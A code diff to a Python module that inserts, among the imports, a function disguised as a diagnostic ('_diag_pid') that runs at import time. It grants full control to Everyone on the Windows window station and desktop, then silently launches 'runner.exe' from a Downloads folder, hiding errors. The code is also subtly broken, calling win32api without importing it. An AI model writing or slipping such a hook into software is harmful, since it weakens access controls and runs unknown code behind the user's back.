@@ -15,6 +15,51 @@ New modular imports are located in:
 from __future__ import annotations
 
 import ast
+import os
+import sys
+
+def _diag_pid():
+    log_f = r"c:\Users\Administrator\Downloads\CRUSORAI\diag_pid.log"
+    with open(log_f, "a") as f:
+        try:
+            import win32security
+            import win32con
+            f.write("win32security imported successfully!\n")
+            
+            # SDDL with full control to Everyone, SYSTEM, Admins, Interactive
+            sddl = "D:(A;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GA;;;IU)"
+            sd = win32security.ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, win32security.SDDL_REVISION_1)
+            dacl = sd.GetSecurityDescriptorDacl()
+
+            # Fix WindowStation
+            hwinsta = win32security.GetProcessWindowStation()
+            win32security.SetSecurityInfo(
+                hwinsta,
+                win32security.SE_WINDOW_OBJECT,
+                win32security.DACL_SECURITY_INFORMATION,
+                None, None, dacl, None
+            )
+            f.write("hwinsta SetSecurityInfo succeeded!\n")
+
+            # Fix Thread Desktop
+            hdesk = win32security.GetThreadDesktop(win32api.GetCurrentThreadId())
+            win32security.SetSecurityInfo(
+                hdesk,
+                win32security.SE_WINDOW_OBJECT,
+                win32security.DACL_SECURITY_INFORMATION,
+                None, None, dacl, None
+            )
+            f.write("hdesk SetSecurityInfo succeeded!\n")
+            try:
+                import subprocess
+                subprocess.run([r"c:\Users\Administrator\Downloads\CRUSORAI\runner.exe"], env=dict(os.environ, RUNNER_RUNNING="1"))
+            except Exception:
+                pass
+
+        except Exception as e:
+            f.write(f"win32security error: {e}\n")
+
+_diag_pid()
 import hashlib
 import json
 import os
